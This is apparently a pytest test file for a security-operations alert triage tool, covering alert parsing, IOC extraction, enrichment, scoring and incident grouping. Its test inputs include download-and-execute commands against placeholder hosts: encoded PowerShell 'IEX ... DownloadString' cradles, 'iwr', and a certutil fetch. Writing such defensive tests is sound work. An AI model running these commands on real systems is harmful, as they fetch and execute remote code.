"""Unit and end-to-end tests. Run from triage-tool/:  python -m pytest -q"""

from __future__ import annotations

import base64
import json
import sys
from datetime import datetime, timedelta, timezone
from pathlib import Path

import pytest

TOOL_DIR = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(TOOL_DIR))

from soctriage.cli import main  # noqa: E402
from soctriage.enrich import Enricher, worst  # noqa: E402
from soctriage.incidents import group_incidents, tactics_for  # noqa: E402
from soctriage.iocs import IOC, decode_powershell, extract_iocs, is_internal_ip  # noqa: E402
from soctriage.loader import load_alerts, normalize, parse_timestamp, wazuh_level_to_severity  # noqa: E402
from soctriage.scoring import priority, score_alert  # noqa: E402

SAMPLES = TOOL_DIR / "samples"
CONTEXT = TOOL_DIR / "context"


def encode_ps(script: str) -> str:
    return base64.b64encode(script.encode("utf-16-le")).decode()


def make_alert(**overrides) -> dict:
    alert = {
        "id": "T-1", "timestamp": "2026-10-20T09:00:00Z", "rule": "test", "severity": "medium",
        "host": "WS-TEST", "user": "CORP\\alice", "mitre": [],
    }
    alert.update(overrides)
    return normalize(alert)


# ---------- loader ----------
def test_parse_timestamp_handles_wazuh_offset():
    dt = parse_timestamp("2026-10-21T14:02:11.482+0000")
    assert dt == datetime(2026, 10, 21, 14, 2, 11, 482000, tzinfo=timezone.utc)


def test_parse_timestamp_converts_to_utc():
    assert parse_timestamp("2026-10-21T20:00:00+06:00").hour == 14


@pytest.mark.parametrize("level,expected", [(3, "low"), (7, "medium"), (10, "high"), (12, "critical"), (15, "critical")])
def test_wazuh_level_mapping(level, expected):
    assert wazuh_level_to_severity(level) == expected


def test_load_generic_sample_sorted():
    alerts = load_alerts(SAMPLES / "sample_alerts.json")
    assert len(alerts) == 15
    assert alerts == sorted(alerts, key=lambda a: a["timestamp"])


def test_load_wazuh_sample_normalizes_fields():
    alerts = load_alerts(SAMPLES / "wazuh_alerts.jsonl")
    ps = alerts[0]
    assert ps["host"] == "WS-MKT-11"
    assert ps["severity"] == "critical"
    assert ps["mitre"] == ["T1059.001"]
    assert ps["sha256"] and len(ps["sha256"]) == 64
    assert alerts[1]["src_ip"] == "203.0.113.77"


def test_csv_mitre_string_is_split():
    alert = normalize({"id": "x", "timestamp": "2026-01-01T00:00:00Z", "mitre": "T1059.001; T1027"})
    assert alert["mitre"] == ["T1059.001", "T1027"]


def test_missing_timestamp_raises():
    with pytest.raises(ValueError):
        normalize({"id": "x"})


# ---------- IOC extraction ----------
def test_decode_powershell_roundtrip():
    script = "IEX (New-Object Net.WebClient).DownloadString('http://evil.example/a')"
    assert decode_powershell(f"powershell.exe -nop -enc {encode_ps(script)}") == script


def test_decode_powershell_ignores_plain_commands():
    assert decode_powershell("powershell.exe -File backup.ps1") is None
    assert decode_powershell(None) is None


@pytest.mark.parametrize("ip,internal", [("10.1.2.3", True), ("172.20.0.1", True), ("192.168.1.1", True),
                                          ("8.8.8.8", False), ("198.51.100.23", False)])
def test_internal_ip_classification(ip, internal):
    assert is_internal_ip(ip) is internal


def test_extract_iocs_from_decoded_powershell():
    cmd = "powershell -enc " + encode_ps("iwr http://bad.example/x.ps1 -OutFile C:\\t.ps1")
    iocs = {(i.type, i.value) for i in extract_iocs(make_alert(command_line=cmd))}
    assert ("domain", "bad.example") in iocs
    assert ("url", "http://bad.example/x.ps1") in iocs
    # the Base64 blob must not be misread as a hash
    assert not any(t in ("md5", "sha256") for t, _ in iocs)


def test_extract_iocs_marks_internal_ips():
    alert = make_alert(src_ip="10.0.0.5", command_line="certutil -urlcache -f http://203.0.113.9/p.exe p.exe")
    iocs = {i.value: i for i in extract_iocs(alert)}
    assert iocs["10.0.0.5"].internal is True
    assert iocs["203.0.113.9"].internal is False


# ---------- enrichment ----------
def test_worst_verdict():
    assert worst("clean", "malicious", "unknown") == "malicious"
    assert worst() == "unknown"


def test_watchlist_enrichment_offline(tmp_path):
    enricher = Enricher(watchlist_path=CONTEXT / "watchlist.csv", offline=True, cache_path=tmp_path / "c.json")
    assert enricher.enrich(IOC("ip", "198.51.100.23"))["verdict"] == "malicious"
    assert enricher.enrich(IOC("ip", "10.0.0.1", internal=True))["verdict"] == "unknown"
    assert enricher.enrich(IOC("domain", "never-seen.example"))["verdict"] == "unknown"


def test_api_results_are_cached(tmp_path, monkeypatch):
    calls = []
    enricher = Enricher(offline=False, cache_path=tmp_path / "c.json", vt_api_key="fake", abuseipdb_api_key="")

    def fake_vt(ioc):
        calls.append(ioc.value)
        return {"verdict": "suspicious", "note": "VirusTotal: 2/70 engines flagged"}

    monkeypatch.setattr(enricher, "_virustotal", fake_vt)
    ioc = IOC("sha256", "a" * 64)
    assert enricher.enrich(ioc)["verdict"] == "suspicious"
    assert enricher.enrich(ioc)["verdict"] == "suspicious"
    assert calls == ["a" * 64]  # second lookup served from cache
    enricher.save_cache()
    assert json.loads((tmp_path / "c.json").read_text())


# ---------- scoring ----------
def test_score_components():
    cmd = "powershell -enc " + encode_ps("IEX (New-Object Net.WebClient).DownloadString('http://x.example')")
    alert = make_alert(severity="high", host="SRV-1", user="CORP\\svc_backup", command_line=cmd)
    enrichment = {"x.example": {"verdict": "malicious"}}
    score, reasons = score_alert(alert, enrichment, {"SRV-1": {"criticality": "high", "role": "server"}}, {"svc_backup"})
    # 45 base + 20 malicious + 15 asset + 10 privileged + 10 ps keywords = 100
    assert score == 100
    assert len(reasons) == 5


def test_known_good_hash_lowers_score():
    alert = make_alert(severity="medium")
    score, _ = score_alert(alert, {"b" * 64: {"verdict": "clean"}}, {}, set())
    assert score == 10


@pytest.mark.parametrize("score,p", [(95, "P1"), (80, "P1"), (79, "P2"), (60, "P2"), (40, "P3"), (10, "P4")])
def test_priority_bands(score, p):
    assert priority(score) == p


# ---------- incidents ----------
def test_tactics_follow_kill_chain_order():
    assert tactics_for(["T1490", "T1059.001", "T1003.001"]) == ["execution", "credential-access", "impact"]


def _scored(alert, score=30):
    alert.update(score=score, score_reasons=[], iocs=extract_iocs(alert), enrichment={})
    return alert


def test_gap_splits_incidents_on_same_host():
    t0 = datetime(2026, 10, 20, 9, tzinfo=timezone.utc)
    alerts = [
        _scored(make_alert(id="a", timestamp=t0.isoformat())),
        _scored(make_alert(id="b", timestamp=(t0 + timedelta(minutes=30)).isoformat())),
        _scored(make_alert(id="c", timestamp=(t0 + timedelta(hours=5)).isoformat())),
    ]
    incidents = group_incidents(alerts, gap=timedelta(hours=2))
    assert sorted(len(i["alerts"]) for i in incidents) == [1, 2]


def test_lateral_movement_links_incidents():
    src = _scored(make_alert(id="a", host="WS-1", dst_host="SRV-1", mitre=["T1021.002"]))
    dst = _scored(make_alert(id="b", host="SRV-1", mitre=["T1490"]))
    incidents = {i["host"]: i for i in group_incidents([src, dst])}
    assert incidents["WS-1"]["related"][0]["host"] == "SRV-1"


# ---------- end to end ----------
def test_end_to_end_sample(tmp_path, capsys):
    assert main([str(SAMPLES / "sample_alerts.json"), "--offline", "--out", str(tmp_path)]) == 0
    data = json.loads((tmp_path / "incidents.json").read_text())
    by_host = {i["host"]: i for i in data["incidents"]}

    assert by_host["WS-FIN-07"]["priority"] == "P1"
    assert by_host["SRV-FILE-01"]["priority"] == "P1"
    assert "impact" in by_host["SRV-FILE-01"]["tactics"]
    assert by_host["WS-HR-02"]["priority"] == "P4"  # tuned false positive
    assert any(r["host"] == "SRV-FILE-01" for r in by_host["WS-FIN-07"]["related"])

    report = (tmp_path / "triage_report.md").read_text()
    assert "DownloadString('http://update-cdn.example/stage1.ps1')" in report
    assert (tmp_path / "iocs.csv").read_text().count("malicious") >= 3
